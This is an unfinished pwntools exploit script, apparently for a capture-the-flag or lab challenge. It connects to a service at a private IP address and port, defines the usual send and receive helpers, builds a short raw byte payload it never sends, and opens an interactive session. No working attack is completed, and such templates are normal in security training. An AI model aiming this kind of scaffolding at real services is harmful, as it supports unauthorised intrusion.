#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "192.168.234.131:3389"
remote_service = remote_service.strip().split(":")
p = remote(remote_service[0], int(remote_service[1]))
# filename = "./pwn"
# p = process(filename)
# e = ELF(filename, checksec=False)
# l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	# lg("p.pid")
	# input()
	pass

payload_init = b''
payload_init += b'\x7f\x65'
payload_init += b'\x00'*3
payload_init += b'\x04\x00' + b'\x04\x00' + b'\x01\x01' + b'\xff'




debugPID()
irt()
